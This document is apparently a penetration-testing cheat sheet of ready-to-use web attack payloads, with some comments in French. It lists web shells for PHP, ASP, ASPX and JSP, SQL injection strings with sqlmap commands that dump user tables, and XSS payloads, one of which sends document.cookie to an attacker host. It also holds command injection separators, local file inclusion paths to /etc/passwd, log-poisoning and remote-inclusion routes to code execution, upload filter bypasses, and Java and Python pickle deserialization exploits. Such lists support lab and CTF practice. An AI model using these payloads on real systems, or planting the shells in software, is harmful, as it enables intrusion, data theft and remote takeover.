# Payloads

---

## Web Shells

### PHP
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
```

### ASP
```asp
<% eval request("cmd") %>
```

### ASPX
```aspx
<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd());%>
```

### JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

---

## SQL Injection

### Authentication bypass
```sql
' OR 1=1-- -
' OR 'a'='a
admin'--
" OR ""="
```

### Union-based
```sql
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password,3 FROM users-- -
```

### Error-based
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
```

### Time-based blind
```sql
' AND sleep(5)-- -
' AND IF(1=1,sleep(5),0)-- -
```

### SQLMap
```bash
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
sqlmap -u "http://TARGET/page?id=1" -D dbname --tables
sqlmap -u "http://TARGET/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch --dbs    # depuis un fichier Burp
```

---

## XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

<!-- Cookie stealing -->
<script>new Image().src="http://ATTACKER_IP/?c="+document.cookie</script>
```

---

## Command Injection

```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
%0a id
```

---

## File Inclusion

### LFI
```
../../../../etc/passwd
....//....//....//....//etc/passwd
/etc/passwd%00                          # null byte (PHP < 5.3)
php://filter/convert.base64-encode/resource=index.php
```

### LFI to RCE
```
# Log poisoning (Apache)
/var/log/apache2/access.log
# Injecter dans le User-Agent : <?php system($_GET['cmd']); ?>

# PHP wrappers
php://input                             # POST data as PHP
data://text/plain;base64,BASE64_PAYLOAD
expect://id                             # si expect est active
```

### RFI
```
http://ATTACKER_IP/shell.php
```

---

## File Upload Bypass

```
# Extensions alternatives
.php -> .php3, .php4, .php5, .phtml, .phar, .phps
.asp -> .aspx, .cer, .asa
.jsp -> .jspx

# Double extension
shell.php.jpg
shell.php.png

# Null byte
shell.php%00.jpg

# Case
shell.pHp

# Content-Type spoof
Content-Type: image/jpeg    (avec un fichier .php)
```

---

## Serialization

### PHP
```php
O:4:"User":1:{s:4:"name";s:6:"admin";}
```

### Java
```
rO0AB...  (base64 de bytes serialises Java)
# Outil : ysoserial
java -jar ysoserial.jar CommonsCollections1 'COMMAND' | base64
```

### Python (pickle)
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('COMMAND',))
print(base64.b64encode(pickle.dumps(Exploit())))
```
